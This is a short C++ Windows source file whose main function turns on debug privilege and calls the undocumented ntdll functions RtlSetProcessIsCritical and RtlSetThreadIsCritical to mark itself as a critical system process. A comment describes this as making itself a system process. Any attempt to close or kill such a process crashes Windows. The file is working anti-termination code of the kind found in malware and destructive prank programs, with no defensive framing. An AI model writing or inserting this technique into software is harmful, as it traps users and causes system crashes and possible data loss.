#include"P.h"


using namespace std;

#define KEY_DOWN(VK_NONAME) ((GetAsyncKeyState(VK_NONAME) & 0x8000) ? 1:0)

typedef VOID(WINAPI* type_RtlSetProcessIsCritical)(BOOLEAN, PBOOLEAN, BOOLEAN);
typedef VOID(WINAPI* type_RtlSetThreadIsCritical)(BOOLEAN, PBOOLEAN, BOOLEAN);
BOOL SetPrivilege() {
	HANDLE hToken;
	TOKEN_PRIVILEGES NewState;
	LUID luidPrivilegeLUID;


	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken) || !LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luidPrivilegeLUID))
	{
		return FALSE;
	}
	NewState.PrivilegeCount = 1;
	NewState.Privileges[0].Luid = luidPrivilegeLUID;
	NewState.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	if (!AdjustTokenPrivileges(hToken, FALSE, &NewState, NULL, NULL, NULL))
	{
		return FALSE;
	}
	return TRUE;
}

void cls(HANDLE hConsole)
{
	COORD coordScreen = { 0,0 };
	DWORD cCharsWritten;
	CONSOLE_SCREEN_BUFFER_INFO csbi;
	DWORD dwConSize;
	GetConsoleScreenBufferInfo(hConsole, &csbi);
	dwConSize = csbi.dwSize.X * csbi.dwSize.Y;
	FillConsoleOutputCharacter(hConsole, (TCHAR)' ', dwConSize, coordScreen, &cCharsWritten);
	GetConsoleScreenBufferInfo(hConsole, &csbi);
	FillConsoleOutputAttribute(hConsole, csbi.wAttributes, dwConSize, coordScreen, &cCharsWritten);
	SetConsoleCursorPosition(hConsole, coordScreen);
	return;
}

void BaohuJincheng() {
	HMODULE hDll = GetModuleHandle(L"ntdll.dll");
	type_RtlSetProcessIsCritical RtlSetProcessIsCritical = (type_RtlSetThreadIsCritical)GetProcAddress(hDll, "RtlSetProcessIsCritical");
	type_RtlSetProcessIsCritical RtlSetThreadIsCritical = (type_RtlSetThreadIsCritical)GetProcAddress(hDll, "RtlSetThreadIsCritical");

	bool bSuccess = SetPrivilege();

	RtlSetProcessIsCritical(TRUE, NULL, FALSE);
	RtlSetThreadIsCritical(TRUE, NULL, FALSE);

	cls(GetStdHandle(STD_OUTPUT_HANDLE));
	SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_RED);
}//调用ntdll.dll使自己成为系统进程
DWORD WINAPI P() {
	BaohuJincheng();
	return 0;
}